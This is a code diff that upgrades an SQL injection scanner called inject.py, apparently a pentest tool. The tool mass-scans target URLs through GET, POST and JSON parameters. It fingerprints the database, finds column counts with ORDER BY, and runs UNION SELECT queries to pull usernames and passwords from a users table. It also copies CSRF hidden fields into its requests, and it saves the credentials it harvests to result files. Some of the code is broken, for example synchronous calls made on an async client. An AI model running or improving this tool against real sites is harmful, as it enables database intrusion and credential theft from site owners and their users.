@@ -2,7 +2,7 @@
 """
 inject.py
 
-Enhanced SQL Injection Testing Framework
+Enhanced SQL Injection Testing Framework v2.2
 
 Author: ZnX Pentester
 """
@@ -18,7 +18,7 @@ BANNER = r"""
                      SQL Injection Testing Framework
               Use only on systems you have permission to test!
 
-                    ZnX Pentester - v2.0
+                    ZnX Pentester - v2.2
 """
 
 import asyncio
@@ -26,16 +26,22 @@ import json
 import logging
 import os
 import sys
+import re
+import time
 from typing import Any, Dict, List, Optional, Tuple, Union
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 import httpx
 import typer
+from bs4 import BeautifulSoup
 
-# Initialize Typer app
-app = typer.Typer(help="SQL Injection Testing Framework - ZnX Pentester v2.0")
+app = typer.Typer(help="SQL Injection Testing Framework - ZnX v2.2")
 
 # Configure logging
+class VerboseFilter(logging.Filter):
+    def filter(self, record):
+        return not getattr(record, 'verbose_only', False)
+
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
@@ -43,25 +49,16 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-
 # ----------------------------
 # Helper Functions
 # ----------------------------
 
-def load_targets(path: str) -> List[str]:
-    """Load list of target URLs from file."""
-    with open(path, 'r') as f:
-        return [line.strip() for line in f if line.strip()]
-
-
-def load_payloads(path: str) -> Dict[str, List[str]]:
-    """Load payloads from JSON file."""
+def load_json(path: str) -> Any:
     with open(path, 'r') as f:
         return json.load(f)
 
 
-def write_result(host: str, lines: List[str]) -> None:
-    """Write scan result to results/<host>.txt."""
+def write_results(host: str, lines: List[str]) -> None:
     os.makedirs('results', exist_ok=True)
     filepath = os.path.join('results', f"{host}.txt")
     with open(filepath, 'w') as fw:
@@ -69,126 +66,195 @@ def write_result(host: str, lines: List[str]) -> None:
     logger.info(f"Result written: {filepath}")
 
 
-def fingerprint_dbms(resp: httpx.Response) -> str:
-    """Identify DBMS from response content or status code."""
-    text = resp.text.lower()
-    if 'mysql' in text or 'you have an error in your sql syntax' in text:
+def fingerprint_dbms(response: httpx.Response, elapsed: float, time_threshold: float = 3.0) -> str:
+    text = response.text.lower()
+    if any(x in text for x in ['mysql', 'you have an error in your sql syntax']):
         return 'mysql'
-    if 'syntax error at or near' in text or 'pg_' in text:
+    if any(x in text for x in ['syntax error at or near', 'pg_sleep', 'pgsql']):
         return 'postgresql'
-    if 'microsoft sql' in text or 'incorrect syntax near' in text:
-        return 'mssql'
-    if 'ora-' in text or 'oracle' in text:
+    if any(x in text for x in ['oracle', 'ora-']):
         return 'oracle'
+    if any(x in text for x in ['microsoft sql', 'incorrect syntax near']):
+        return 'mssql'
+    if elapsed >= time_threshold:
+        return 'unknown-time'
     return 'unknown'
 
 
-def extract_union(
-    dbms: str,
-    base_url: str,
-    client: httpx.AsyncClient,
-    timeout: int
-) -> Tuple[Optional[str], Optional[str]]:
-    """Attempt UNION-based extraction for users(username,password)."""
+def get_form_csrf(html: str) -> Tuple[Dict[str,str], str]:
+    """Extract CSRF token from first form if exists"""
+    soup = BeautifulSoup(html, 'html.parser')
+    form = soup.find('form')
+    token_data = {}
+    action = form.get('action') if form else ''
+    if form:
+        for inp in form.find_all('input', {'type': 'hidden'}):
+            name = inp.get('name')
+            val = inp.get('value', '')
+            token_data[name] = val
+    return token_data, action
+
+
+def detect_column_count(base_url: str, payload: str, client: httpx.AsyncClient, timeout: int) -> int:
+    """Discover number of columns via ORDER BY technique"""
+    count = 1
     parsed = urlparse(base_url)
     qs = parse_qs(parsed.query)
-    field_list = 'username,password'
-    # build union payloads
-    if dbms == 'mysql':
-        union = f"' UNION SELECT {field_list} FROM users-- "
-    elif dbms == 'postgresql':
-        union = f"' UNION SELECT {field_list} FROM users-- "
-    else:
-        return None, None
     param = list(qs.keys())[0]
-    qs[param] += union
-    new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
-    try:
-        res = asyncio.run(client.get(new_url, timeout=timeout))
-        # crude parse: assume CSV in body
-        parts = res.text.split(',')
-        return parts[0], parts[1]
-    except Exception:
-        return None, None
+    while count <= 10:
+        test_payload = f"' ORDER BY {count}--"
+        qs[param] = qs[param][0] + test_payload
+        url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+        try:
+            r = client.get(url, timeout=timeout)
+            if r.status_code >= 500:
+                return count - 1
+        except:
+            return count - 1
+        count += 1
+    return count - 1
 
 
-async def test_get(
-    url: str,
-    payloads: Dict[str, List[str]],
-    client: httpx.AsyncClient,
-    timeout: int
-) -> Optional[Dict[str, Any]]:
-    """Test GET parameters for SQLi."""
-    parsed = urlparse(url)
+def extract_union_data(dbms: str, base_url: str, client: httpx.AsyncClient, timeout: int) -> Tuple[Optional[str], Optional[str]]:
+    """Perform UNION-based extraction after discovering column count"""
+    parsed = urlparse(base_url)
     qs = parse_qs(parsed.query)
-    if not qs:
-        return None
-    original_resp = await client.get(url, timeout=timeout)
-    base_len = len(original_resp.text)
+    columns = detect_column_count(base_url, '', client, timeout)
+    nulls = ','.join('NULL' for _ in range(columns - 2))
+    select_cols = 'username,password'
+    payload = f"' UNION SELECT {nulls},{select_cols} FROM users--"
+    param = list(qs.keys())[0]
+    qs[param] = qs[param][0] + payload
+    url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+    try:
+        r = client.get(url, timeout=timeout)
+        # crude parse
+        match = re.search(r"(\w+),(\w+)", r.text)
+        if match:
+            return match.group(1), match.group(2)
+    except:
+        pass
+    return None, None
+
+
+async def test_request(
+    method: str,
+    url: str,
+    data: Optional[Dict[str,Any]],
+    json_data: Optional[Dict[str,Any]],
+    headers: Dict[str,str],
+    payloads: Dict[str,List[str]],
+    client: httpx.AsyncClient,
+    timeout: int,
+    verbose: bool
+) -> Optional[Dict[str,Any]]:
+    # baseline
+    start = time.time()
+    base_resp = await client.request(method, url, data=data, json=json_data, headers=headers, timeout=timeout)
+    base_time = time.time() - start
+    base_len = len(base_resp.text)
+    # csrf token injection
+    csrf_tokens, form_action = get_form_csrf(base_resp.text)
     for inj_type, plist in payloads.items():
-        for payload in plist:
-            param = list(qs.keys())[0]
-            orig = qs[param][0]
-            qs[param] = orig + payload
-            new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+        for p in plist:
+            test_data, test_json = data.copy() if data else {}, json_data.copy() if json_data else {}
+            hdrs = headers.copy()
+            # choose injection location
+            if json_data:
+                for k in test_json:
+                    test_json[k] = str(test_json[k]) + p
+            elif data:
+                for k in test_data:
+                    test_data[k] = str(test_data[k]) + p
+            else:
+                # GET param
+                parsed = urlparse(url)
+                qs = parse_qs(parsed.query)
+                param = list(qs.keys())[0]
+                qs[param] = qs[param][0] + p
+                url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+            # add csrf
+            if csrf_tokens and data is not None:
+                test_data.update(csrf_tokens)
+            # send request
+            t0 = time.time()
             try:
-                r = await client.get(new_url, timeout=timeout)
+                r = await client.request(method, url, data=test_data or None, json=test_json or None, headers=hdrs, timeout=timeout)
             except Exception:
                 continue
-            dbms = fingerprint_dbms(r)
-            # boolean check
+            elapsed = time.time() - t0
+            dbms = fingerprint_dbms(r, elapsed)
+            if verbose:
+                logger.info(f"Injected [{inj_type}] payload: {p}", extra={'verbose_only':True})
+            # conditions
             if inj_type == 'boolean' and len(r.text) != base_len:
-                user, pwd = extract_union(dbms, url, client, timeout)
-                return dict(url=url, dbms=dbms, type=inj_type, username=user, password=pwd)
-            # error check
-            if inj_type == 'error' and dbms != 'unknown':
-                user, pwd = extract_union(dbms, url, client, timeout)
-                return dict(url=url, dbms=dbms, type=inj_type, username=user, password=pwd)
-            # TODO: union/time checks
+                user, pwd = extract_union_data(dbms, url, client, timeout)
+            elif inj_type == 'time' and elapsed > base_time + 3:
+                user, pwd = extract_union_data(dbms, url, client, timeout)
+            elif inj_type == 'error' and dbms != 'unknown':
+                user, pwd = extract_union_data(dbms, url, client, timeout)
+            else:
+                continue
+            return {'url': url, 'dbms': dbms, 'type': inj_type, 'username': user, 'password': pwd}
     return None
-
 
 async def run_scan(
     targets: List[str],
-    payloads: Dict[str, List[str]],
+    payloads: Dict[str,List[str]],
     concurrency: int,
     timeout: int,
-    proxy: Optional[str]
-) -> List[Dict[str, Any]]:
-    """Run async scan on all targets."""
+    proxy: Optional[str],
+    verbose: bool
+) -> List[Dict[str,Any]]:
     semaphore = asyncio.Semaphore(concurrency)
-    client_args: Dict[str, Union[int, str, Dict[str, str]]] = {'timeout': timeout}
+    client_args: Dict[str,Any] = {'timeout': timeout}
     if proxy:
         client_args['proxies'] = proxy
     async with httpx.AsyncClient(**client_args) as client:
         tasks = []
-        for url in targets:
-            async def sem_task(u=url):
+        for target in targets:
+            method = 'GET'
+            data = None
+            json_data = None
+            headers = {}
+            parsed = urlparse(target)
+            if 'post:' in target:
+                _, actual = target.split('post:')
+                method = 'POST'
+                # expected format: url|key1=val1&key2=val2
+                url, body = actual.split('|',1)
+                data = dict(pair.split('=') for pair in body.split('&'))
+            if 'json:' in target:
+                _, actual = target.split('json:')
+                method = 'POST'
+                url, body = actual.split('|',1)
+                json_data = json.loads(body)
+                headers['Content-Type'] = 'application/json'
+            async def sem(u=target, m=method, d=data, j=json_data, h=headers):
                 async with semaphore:
-                    return await test_get(u, payloads, client, timeout)
-            tasks.append(sem_task())
+                    return await test_request(m, u, d, j, h, payloads, client, timeout, verbose)
+            tasks.append(sem())
         results = await asyncio.gather(*tasks)
     return [r for r in results if r]
 
-
-# ----------------------------
-# CLI Command
-# ----------------------------
 @app.command()
 def main(
-    targets: str = typer.Option(..., help="Path to targets.txt"),
-    payloads: str = typer.Option('payloads.json', help="Path to payloads.json"),
-    concurrency: int = typer.Option(10, help="Max parallel requests"),
-    timeout: int = typer.Option(5, help="Request timeout (s)"),
-    proxy: Optional[str] = typer.Option(None, help="HTTP proxy URL"),
-    summary: bool = typer.Option(False, help="Generate summary file")
+    targets_file: str = typer.Option(..., '--targets', help="Path to targets.txt"),
+    payloads_file: str = typer.Option('payloads.json', '--payloads', help="Path to payloads.json"),
+    concurrency: int = typer.Option(10, '--concurrency', help="Max parallel requests"),
+    timeout: int = typer.Option(5, '--timeout', help="Request timeout (s)"),
+    proxy: Optional[str] = typer.Option(None, '--proxy', help="HTTP proxy URL"),
+    summary: bool = typer.Option(False, '--summary', help="Generate summary file"),
+    verbose: bool = typer.Option(False, '--verbose', help="Verbose debug output")
 ):
-    """Execute SQLi scan against target URLs."""
+    """Execute enhanced SQLi scan against target URLs."""
     print(BANNER)
-    tgts = load_targets(targets)
-    plds = load_payloads(payloads)
-    logger.info(f"Starting scan on {len(tgts)} targets (concurrency={concurrency})")
-    results = asyncio.run(run_scan(tgts, plds, concurrency, timeout, proxy))
+    targets = [line.strip() for line in open(targets_file) if line.strip()]
+    payloads = load_json(payloads_file)
+    if verbose:
+        logger.setLevel(logging.DEBUG)
+    logger.info(f"Starting scan on {len(targets)} targets (concurrency={concurrency})")
+    results = asyncio.run(run_scan(targets, payloads, concurrency, timeout, proxy, verbose))
     summaries: List[str] = []
     for r in results:
         host = urlparse(r['url']).hostname or 'unknown'
@@ -199,15 +265,13 @@ def main(
             f"[+] username: {r.get('username')}",
             f"[+] password: {r.get('password')}"
         ]
-        write_result(host, lines)
+        write_results(host, lines)
         summaries.append("\n".join(lines))
-
     if summary and summaries:
         os.makedirs('results', exist_ok=True)
         with open('results/summary.txt', 'w') as sf:
             sf.write("\n\n".join(summaries))
         logger.info("Summary written: results/summary.txt")
-
 
 if __name__ == '__main__':
     app()
